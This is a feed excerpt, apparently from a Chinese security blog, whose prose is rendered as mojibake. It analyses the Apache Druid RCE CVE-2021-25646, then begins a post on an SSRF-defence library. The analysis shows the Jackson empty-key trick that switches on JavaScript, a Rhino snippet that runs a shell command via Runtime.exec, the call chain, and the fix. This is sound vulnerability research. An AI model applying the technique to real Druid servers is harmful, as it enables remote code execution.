    <content type="html"><![CDATA[<p>Litch1å¤§ä½¬çš„è¿™ä¸ªæ´æœ‰æ„æ€ï¼Œç»ˆäºæœ‰æ—¶é—´åˆ†æä¸‹ï¼Œè®°å½•ä¸‹åˆ†æè¿‡ç¨‹</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><a href="https://archive.apache.org/dist/druid/">https://archive.apache.org/dist/druid/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$wget</span> https://archive.apache.org/dist/druid/0.20.0/apache-druid-0.20.0-bin.tar.gz &amp;&amp; tar -xzvf apache-druid-0.20.0-bin.tar.gz</span><br></pre></td></tr></table></figure><p>æ ¹æ®å‚è€ƒï¼Œä¿®æ”¹conf/druid/single-server/micro-quickstart/coordinator-overlord/jvm.configï¼Œæœ«å°¾å¢åŠ è°ƒè¯•å‚æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Xdebug -Xnoagent -Djava.compiler&#x3D;NONE -Xrunjdwp:transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="èƒŒæ™¯çŸ¥è¯†"><a href="#èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="èƒŒæ™¯çŸ¥è¯†"></a>èƒŒæ™¯çŸ¥è¯†</h2><h3 id="Jacksonæ³¨è§£"><a href="#Jacksonæ³¨è§£" class="headerlink" title="Jacksonæ³¨è§£"></a>Jacksonæ³¨è§£</h3><h4 id="nameä¸ºç©ºå­—ç¬¦ä¸²çš„CreatorProperty"><a href="#nameä¸ºç©ºå­—ç¬¦ä¸²çš„CreatorProperty" class="headerlink" title="nameä¸ºç©ºå­—ç¬¦ä¸²çš„CreatorProperty"></a>nameä¸ºç©ºå­—ç¬¦ä¸²çš„CreatorProperty</h4><p>ä½œè€…ç»™å‡ºè¿™ä¸ªæ¼æ´çš„å…³é”®ç‚¹è§£é‡Š</p><blockquote><p>æ¼æ´çš„å…³é”®ï¼š<br>åœ¨äºå¯¹ç”¨JsonCreatoræ³¨è§£ä¿®é¥°çš„æ–¹æ³•æ¥è¯´ï¼Œæ–¹æ³•çš„æ‰€æœ‰å‚æ•°éƒ½ä¼šè§£ææˆCreatorPropertyç±»å‹ï¼Œå¯¹äºæ²¡æœ‰ä½¿ç”¨JsonPropertyæ³¨è§£ä¿®é¥°çš„å‚æ•°æ¥è¯´,ä¼šåˆ›å»ºä¸€ä¸ªnameä¸ºâ€â€çš„CreatorPropertyï¼Œåœ¨ç”¨æˆ·ä¼ å…¥é”®ä¸ºâ€â€çš„jsonå¯¹è±¡æ—¶å°±ä¼šè¢«è§£æåˆ°å¯¹åº”çš„å‚æ•°ä¸Šã€‚</p></blockquote><h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h4><p>å…¶ä¸­ä¸è¯¥æ¼æ´ç›¸å…³çš„æ³¨è§£å¦‚ä¸‹</p><ul><li>JsonCreator</li><li>JsonProperty</li><li>JacksonInject</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person4</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JavaScriptConfig config;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JsonCreator</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person4</span><span class="params">(<span class="meta">@JsonProperty(&quot;age&quot;)</span> <span class="keyword">int</span> age,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="meta">@JsonProperty(&quot;name&quot;)</span> String name,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="meta">@JacksonInject</span> JavaScriptConfig config)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.config = config;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User [name=&quot;</span> + name + <span class="string">&quot;, age=&quot;</span> + age + <span class="string">&quot;, config=&quot;</span> + config.toString() + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String sp4 = <span class="string">&quot;&#123;\&quot;enabled\&quot;:true&#125;&quot;</span>;</span><br><span class="line">            ObjectMapper mapper4 = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">            JavaScriptConfig pp4 = mapper4.readValue(sp4, JavaScriptConfig.class);</span><br><span class="line">            System.out.println(pp4);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;---------------------------&quot;</span>);</span><br><span class="line">            String sp5 = <span class="string">&quot;&#123;\&quot;age\&quot;:10,\&quot;name\&quot;:\&quot;m0d9\&quot;,\&quot;\&quot;:&#123;\&quot;enabled\&quot;:true&#125;&#125;&quot;</span>;</span><br><span class="line">            ObjectMapper mapper5 = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">            Person4 pp5 = mapper5.readValue(sp5, Person4.class);</span><br><span class="line">            System.out.println(pp5);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>output å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JavaScriptConfig&#123;enabled&#x3D;true&#125;</span><br><span class="line">---------------------------</span><br><span class="line">User [name&#x3D;m0d9, age&#x3D;10, config&#x3D;JavaScriptConfig&#123;enabled&#x3D;true&#125;]</span><br></pre></td></tr></table></figure><h4 id="Jacksonååºåˆ—åŒ–æµç¨‹è·Ÿè¸ª"><a href="#Jacksonååºåˆ—åŒ–æµç¨‹è·Ÿè¸ª" class="headerlink" title="Jacksonååºåˆ—åŒ–æµç¨‹è·Ÿè¸ª"></a>Jacksonååºåˆ—åŒ–æµç¨‹è·Ÿè¸ª</h4><p>çš„ç¡®å¦‚Litch1æ‰€è¨€ï¼Œkeyä¸ºâ€â€çš„value({â€œenabledâ€:true})è¢«jacksonååºåˆ—åŒ–ä¹‹åèµ‹å€¼ç»™configã€‚ä¸ºä½•å¦‚æ­¤ï¼Ÿè·Ÿè¸ªä¸‹Jackson JsonCreatorçš„é€»è¾‘</p><p>ä½œè€…ä¹Ÿæœ‰ç»™å‡ºå¯¹åº”çš„å…³é”®è¿‡ç¨‹</p><blockquote><p>com.fasterxml.jackson.databind.deser.BeanDeserializer#_deserializeUsingPropertyBasedåœ¨è§£æçš„è¿‡ç¨‹ä¸­ï¼Œä¼šæ‹¿è§£æåˆ°çš„jsonä¸²ä¸­çš„â€œé”®åâ€å»æŸ¥æ‰¾å½“å‰è§£æå¯¹è±¡ä¸­å¯¹åº”çš„creatorPropertyï¼Œè¿™æ­¥å¯¹åº”çš„æ˜¯findCreatorPropertyæ–¹æ³•ï¼ŒfindCreatorPropertyæ–¹æ³•ä¼šå»_propertyLookup è¿™ä¸ªHashMapä¸­æŸ¥æ‰¾â€é”®åâ€å¯¹åº”çš„å±æ€§ï¼Œåœ¨_propertyLookupä¸­å¯ä»¥çœ‹åˆ°å…¶ä¸­æ²¡æœ‰ç”¨JsonPropertyæ³¨é‡Šä¿®é¥°çš„JavaScriptConfigçš„é”®ä¸ºâ€â€ï¼Œè¦æ˜¯jsonä¸²ä¸­çš„é”®ä¹Ÿä¸ºâ€â€ï¼Œå°±èƒ½åŒ¹é…ä¸Šï¼Œå–å‡ºJavaScriptConfigå¯¹åº”çš„creatorProperty</p></blockquote><p>ç®€å•è€Œè¨€ï¼ŒJacksonååºåˆ—åŒ–è¿‡ç¨‹åŸºæœ¬å¦‚ä¸‹</p><ol><li>è°ƒç”¨mapper.readValue(jsonString, DstClass.class)</li><li>åˆ†æDstClassï¼Œæœ‰å“ªäº›å±æ€§Propertyï¼Œä»¥åŠè¿™äº›å±æ€§å¯¹åº”çš„setæ–¹æ³•(creatorProperty)æ˜¯ä»€ä¹ˆ</li><li>ä¾æ¬¡è¯»å–jsonString key &amp; valueï¼Œæ ¹æ®æ­¥éª¤2ä¸­keyå¯¹åº”çš„setæ–¹æ³•ï¼Œè°ƒç”¨å¹¶åˆ›å»ºã€‚</li></ol><p>å…¶ä¸­ï¼Œåˆ†æDstClassï¼Œåœ¨com.fasterxml.jackson.databind.deser.BeanDeserializerè¿™ä¸ªç±»ä¸­å®ç°ï¼Œæ­¥éª¤2ä¸­çš„ç»“æœä¿å­˜åœ¨BeanDeserializer#_beanProperties Mapç±»é‡Œé¢ï¼Œä¹‹åé€šè¿‡PropertyBeanCreatorè½¬æ¢ä¸ºBeanDeserializer#_propertyLookup</p><p><img src="/images/pasted-117.png" alt="upload successful"></p><p><img src="/images/pasted-118.png" alt="upload successful"></p><p><strong>å¯è§configå¯¹åº”çš„CreatorProperty nameä¸ºâ€â€ï¼Œå› æ­¤_propertyLookupç”Ÿæˆäº†nameä¸ºâ€â€,valueä¸ºconfigèµ‹å€¼å‡½æ•°çš„ä¸€æ¡è®°å½•</strong></p><p>æ­¥éª¤3ä¸­å±æ€§èµ‹å€¼ä¸­ï¼Œæ ¹æ®keyæ‰¾å¯¹åº”setæ–¹æ³•ï¼Œå…·ä½“å®ç°å‡½æ•°ä¸ºfindCreatorPropertyï¼Œå°±æ˜¯ä»_propertyLookupå¯»æ‰¾çš„ï¼Œç„¶åå®ç°å±æ€§èµ‹å€¼</p><h3 id="Rhino"><a href="#Rhino" class="headerlink" title="Rhino"></a>Rhino</h3><p>javascriptå¼•æ“ï¼Œè¿™é‡Œå’Œå‰é¢æ¯”å°±ç®€å•äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Context cx = Context.enter();</span><br><span class="line">cx.setOptimizationLevel(<span class="number">9</span>);</span><br><span class="line">ScriptableObject scope = cx.initStandardObjects();</span><br><span class="line">String script = <span class="string">&quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#x27;open -a calculator.app&#x27;)&#125;&quot;</span>;</span><br><span class="line">Function fnApply = cx.compileFunction(scope, script, <span class="string">&quot;script&quot;</span>, <span class="number">1</span>, <span class="keyword">null</span>);</span><br><span class="line">fnApply.call(cx,scope,scope,<span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">Context.exit();</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æ•´ä¸ªæ¼æ´çš„ç²¾é«“æœ‰ä¸¤ç‚¹</p><h3 id="1-åˆ©ç”¨Jackson-JsonCreatoræ³¨è§£ç‰¹æ€§ï¼Œè¦†ç›–JavaScriptDimFilter-JavaScriptConfig-configå±æ€§ï¼Œå¼€å¯javascriptåŠŸèƒ½"><a href="#1-åˆ©ç”¨Jackson-JsonCreatoræ³¨è§£ç‰¹æ€§ï¼Œè¦†ç›–JavaScriptDimFilter-JavaScriptConfig-configå±æ€§ï¼Œå¼€å¯javascriptåŠŸèƒ½" class="headerlink" title="1. åˆ©ç”¨Jackson JsonCreatoræ³¨è§£ç‰¹æ€§ï¼Œè¦†ç›–JavaScriptDimFilter JavaScriptConfig configå±æ€§ï¼Œå¼€å¯javascriptåŠŸèƒ½"></a>1. åˆ©ç”¨Jackson JsonCreatoræ³¨è§£ç‰¹æ€§ï¼Œè¦†ç›–JavaScriptDimFilter JavaScriptConfig configå±æ€§ï¼Œå¼€å¯javascriptåŠŸèƒ½</h3><p>è¦†ç›–configè¿‡ç¨‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SamplerResource#SamplerResponse</span><br><span class="line">  IndexTaskSamplerSpec#IndexTaskSamplerSpec</span><br><span class="line">    IndexTask.IndexIngestionSpec#IndexIngestionSpec</span><br><span class="line">      DataSchema#DataSchema</span><br><span class="line">        TransformSpec#TransformSpec</span><br><span class="line">          JavaScriptDimFilter#JavaScriptDimFilter</span><br></pre></td></tr></table></figure><h3 id="2-JavaScriptDimFilter-toFilter-è§¦å‘å›æº¯"><a href="#2-JavaScriptDimFilter-toFilter-è§¦å‘å›æº¯" class="headerlink" title="2. JavaScriptDimFilter#toFilter è§¦å‘å›æº¯"></a>2. JavaScriptDimFilter#toFilter è§¦å‘å›æº¯</h3><p>ä½œè€…ç»™çš„pocæ˜¯å›æº¯åˆ°SamplerResource#postå¯ç”¨é“¾ï¼Œå¯¹åº”è§¦å‘çš„è°ƒç”¨æ ˆå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">toFilter:149, JavaScriptDimFilter (org.apache.druid.query.filter)</span><br><span class="line">&lt;init&gt;:57, Transformer (org.apache.druid.segment.transform)</span><br><span class="line">toTransformer:126, TransformSpec (org.apache.druid.segment.transform)</span><br><span class="line">decorate:117, TransformSpec (org.apache.druid.segment.transform)</span><br><span class="line">buildReader:209, InputSourceSampler (org.apache.druid.indexing.overlord.sampler)</span><br><span class="line">sample:106, InputSourceSampler (org.apache.druid.indexing.overlord.sampler)</span><br><span class="line">sample:94, IndexTaskSamplerSpec (org.apache.druid.indexing.overlord.sampler)</span><br><span class="line">post:41, SamplerResource (org.apache.druid.indexing.overlord.sampler)</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>æ¼æ´ä¿®å¤prï¼š<a href="https://github.com/apache/druid/pull/10818/files/1f7fc3c929a3b03fed69a03d2f3f96898c74a6d0">https://github.com/apache/druid/pull/10818/files/1f7fc3c929a3b03fed69a03d2f3f96898c74a6d0</a></p><p>å…¶ä¸­æœ€é‡è¦çš„ä¿®æ”¹åœ¨core/src/main/java/org/apache/druid/guice/GuiceAnnotationIntrospector.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> JsonIgnoreProperties.<span class="function">Value <span class="title">findPropertyIgnorals</span><span class="params">(Annotated ac)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// We should not allow empty names in any case. However, there is a known bug in Jackson deserializer</span></span><br><span class="line">  <span class="comment">// with ignorals (_arrayDelegateDeserializer is not copied when creating a contextual deserializer.</span></span><br><span class="line">  <span class="comment">// See https://github.com/FasterXML/jackson-databind/issues/3022 for more details), which makes array</span></span><br><span class="line">  <span class="comment">// deserialization failed even when the array is a valid field. To work around this bug, we return</span></span><br><span class="line">  <span class="comment">// an empty ignoral when the given Annotated is a parameter with JsonProperty that needs to be deserialized.</span></span><br><span class="line">  <span class="comment">// This is valid because every property with JsonProperty annoation should have a non-empty name.</span></span><br><span class="line">  <span class="comment">// We can simply remove the below check after the Jackson bug is fixed.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// This check should be fine for so-called delegate creators that have only one argument without</span></span><br><span class="line">  <span class="comment">// JsonProperty annotation, because this method is not even called for the argument of</span></span><br><span class="line">  <span class="comment">// delegate creators. I&#x27;m not 100% sure why it&#x27;s not called, but guess it&#x27;s because the argument</span></span><br><span class="line">  <span class="comment">// is some Java type that Jackson already knows how to deserialize. Since there is only one argument,</span></span><br><span class="line">  <span class="comment">// Jackson perhaps is able to just deserialize it without introspection.</span></span><br><span class="line">  <span class="keyword">if</span> (ac <span class="keyword">instanceof</span> AnnotatedParameter) &#123;</span><br><span class="line">    <span class="keyword">final</span> AnnotatedParameter ap = (AnnotatedParameter) ac;</span><br><span class="line">    <span class="keyword">if</span> (ap.hasAnnotation(JsonProperty.class)) &#123;</span><br><span class="line">      <span class="keyword">return</span> JsonIgnoreProperties.Value.empty();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> JsonIgnoreProperties.Value.forIgnoredProperties(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éJsonPropertyä¼šåœ¨_propertyLookupè¡¨ä¸­ç”Ÿæˆä¸€æ¡è®°å½•nameä¸ºâ€â€ç©ºçš„æ˜ å°„ï¼Œæ­¤å¤„ç›´æ¥å°†éJsonPropertyçš„å±æ€§å¿½ç•¥ï¼Œä¹Ÿå°±ä¸ä¼šæœ‰åç»­çš„JavaScriptConfigååºåˆ—åŒ–</p><h2 id="æ‰©æ•£æ€è€ƒ"><a href="#æ‰©æ•£æ€è€ƒ" class="headerlink" title="æ‰©æ•£æ€è€ƒ"></a>æ‰©æ•£æ€è€ƒ</h2><ol><li><p>Jackson nameä¸ºç©ºå­—ç¬¦ä¸²çš„CreatorPropertyå˜é‡è¦†ç›–ï¼Œæ˜¯ä¸ªé€šç”¨é—®é¢˜ï¼Œå¦‚ä½•è‡ªåŠ¨åŒ–å‘ç°</p></li><li><p>å‘ç°å¯è¦†ç›–çš„å˜é‡ï¼Œå¦‚ä½•åˆ¤æ–­æ˜¯å¦å¯åˆ©ç”¨ï¼Œç”šè‡³RCEï¼Ÿ</p></li></ol><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡ä»æ¼æ´äº§ç”Ÿçš„æ€è·¯ï¼Œç®€è¦åˆ†æäº†CVE-2021-25646å½¢æˆçš„æˆå› ï¼Œå³Jackson JsonCreatorçš„ç‰¹æ€§ï¼Œå’ŒDruid æ”¯æŒRhinoå¼•æ“ï¼Œå¯¼è‡´æœ€ç»ˆè¦†ç›–javascriptconfigé»˜è®¤å‚æ•°ï¼Œå¯ä»¥æ‰§è¡ŒRCEã€‚å…¶å®å’Œå‚è€ƒä¸­çš„å‡ ç¯‡åˆ†ææ–‡ç« ç›¸æ¯”æ²¡ä»€ä¹ˆå…¶ä»–æ–°çš„ä¸œè¥¿ã€‚</p><p>ä»æ¼æ´æŒ–æ˜æ€è·¯ï¼ŒçŒœæµ‹å¤§ä½¬äº‹åº”è¯¥æ˜¯å…ˆçŸ¥é“Jackson JsonCreatorçš„è¿™ä¸ªç‰¹æ€§çš„ï¼Œç„¶åç›¯ç€Rhinoå¼•æ“æäº‹æƒ…ï¼Œæ‰¾å‡ºåˆ©ç”¨é“¾ã€‚å¦‚æœäº‹å…ˆæœªçŸ¥ï¼Œä»Rhinoè¿™ç‚¹ç›´æ¥å»å•ƒJacksonï¼Œé‚£å°±æ›´åŠ ä½©æœäº†ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw">tomcatä¸å‡ºç½‘å›æ˜¾è¿ç»­å‰§ç¬¬å…­é›†</a></li><li>[2] <a href="https://paper.seebug.org/1476/">æ¼æ´å¤ç°: Apache Druid è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ (CVE-2021-25646)</a></li><li>[3] <a href="https://paper.seebug.org/1481/">Apache Druid è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ(CVE-2021-25646)</a></li><li>[4] <a href="https://blog.csdn.net/zhaoruixiang1111/article/details/52972442">Guiceä¹‹ServletåŸºç¡€</a></li><li>[5] <a href="https://www.freebuf.com/vuls/263276.html">Apache Druidè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ(CVE-2021-25646)</a></li><li>[6] <a href="https://blog.csdn.net/blwinner/article/details/98532847">Jacksonä¹‹æ³¨è§£å¤§å…¨</a></li><li>[7] <a href="https://druid.apache.org/docs/latest/development/javascript.html">JavaScript programming guide</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Litch1å¤§ä½¬çš„è¿™ä¸ªæ´æœ‰æ„æ€ï¼Œç»ˆäºæœ‰æ—¶é—´åˆ†æä¸‹ï¼Œè®°å½•ä¸‹åˆ†æè¿‡ç¨‹&lt;/p&gt;
&lt;h2 id=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒæ­å»º&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒæ­å»º&quot;&gt;&lt;/a&gt;ç¯å¢ƒæ­å»º&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://archive.apache.org/dist/druid/&quot;&gt;https://archive.apache.org/dist/druid/&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$wget&lt;/span&gt; https://archive.apache.org/dist/druid/0.20.0/apache-druid-0.20.0-bin.tar.gz &amp;amp;&amp;amp; tar -xzvf apache-druid-0.20.0-bin.tar.gz&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ ¹æ®å‚è€ƒï¼Œä¿®æ”¹conf/druid/single-server/micro-quickstart/coordinator-overlord/jvm.configï¼Œæœ«å°¾å¢åŠ è°ƒè¯•å‚æ•°&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-Xdebug -Xnoagent -Djava.compiler&amp;#x3D;NONE -Xrunjdwp:transport&amp;#x3D;dt_socket,server&amp;#x3D;y,suspend&amp;#x3D;n,address&amp;#x3D;5005&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´åˆ†æ" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="Druid" scheme="http://m0d9.me/tags/Druid/"/>
    
  </entry>
  
  <entry>
    <title>pyAntiSSRFï¼špython SSRFé˜²å¾¡SDK</title>
    <link href="http://m0d9.me/2020/12/25/pyAntiSSRF/"/>
    <id>http://m0d9.me/2020/12/25/pyAntiSSRF/</id>
    <published>2020-12-25T02:34:00.000Z</published>
    <updated>2021-02-26T07:02:52.454Z</updated>
    
    <content type="html"><![CDATA[<p>å‘ç°å±…ç„¶æ²¡æœ‰ç‰¹åˆ«å¥½ç”¨çš„pythoné˜²å¾¡ssrfå¥½ç”¨çš„pipåº“ï¼Œé€ ä¸ªè½®å­</p><ul><li>æ”¯æŒpipç®€å•å®‰è£…</li><li>æ”¯æŒ py2&amp;py3</li><li>ç›´æ¥é€šè¿‡å‚æ•°å¼•ç”¨ï¼Œç›´æ¥hijackæœ€å¸¸ç”¨çš„requestsåº“ï¼Œä¸å¼•å…¥ç¬¬ä¸‰æ–¹å‡½æ•°</li><li>æ”¯æŒé˜²å¾¡DNS rebinding</li></ul><h2 id="SSRFåŸç†åŠé˜²å¾¡"><a href="#SSRFåŸç†åŠé˜²å¾¡" class="headerlink" title="SSRFåŸç†åŠé˜²å¾¡"></a>SSRFåŸç†åŠé˜²å¾¡</h2><p>ssrfæ”»å‡»åŠé˜²å¾¡è¿™é‡Œä¸å»¶ä¼¸ï¼Œå¯å‚è€ƒã€1ã€‘ï¼Œpç¥è®²çš„æŒºæ˜ç™½äº†ï¼Œæä¸¤ç‚¹</p><ol><li>åŸæ–‡æ²¡æ¶‰åŠåˆ°dns rebindingçš„é˜²å¾¡ï¼Œå…¶å®é˜²å¾¡æ€è·¯ä¹Ÿå¾ˆç®€å•ï¼Œåªè¿›è¡Œ1æ¬¡dnsè¯·æ±‚å³å¯</li><li>å¾ªç¯hijack requestsè¿™ä¸ªæ€è·¯æåˆ°è¿‡ï¼Œä½†æ˜¯ä¸æ˜¯æœ€ä¼˜è§£ï¼Œå…¶å®ç›´æ¥hijack requests.sessions.Session.requestå³å¯ï¼Œæ‰€æœ‰çš„requests get/postæœ€ç»ˆéƒ½è°ƒç”¨çš„è¿™ä¸ªå‡½æ•°</li></ol><p>å…·ä½“æ²¡å•¥å¯è¯´çš„ï¼Œçœ‹ä»£ç ã€2ã€‘å§</p><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p><code>pip install pyAntiSSRF</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. import &amp; patch requestsåº“</span></span><br><span class="line"><span class="keyword">import</span> pyAntiSSRF</span><br><span class="line">pyAntiSSRF.patchRequests()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. é€šè¿‡å‚æ•°anti_ssrfï¼ˆget/post/requestå‡½æ•°éƒ½æ”¯æŒï¼Œé»˜è®¤ä¸å¼€å¯ï¼‰ï¼Œæ§åˆ¶æ˜¯å¦å¼€å¯ssrfé˜²å¾¡ï¼Œå¦‚æœå¼€å¯ä¸”ç›®æ ‡ipæ˜¯å†…ç½‘ï¼Œåˆ™ä¼šæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># custom requests usage</span></span><br><span class="line">requests.get(<span class="string">&quot;http://10.10.10.10/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># patch requests by hijack requests.sessions.Session.request, default disable</span></span><br><span class="line">requests.get(<span class="string">&quot;http://10.10.10.10/&quot;</span>, anti_ssrf=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raise 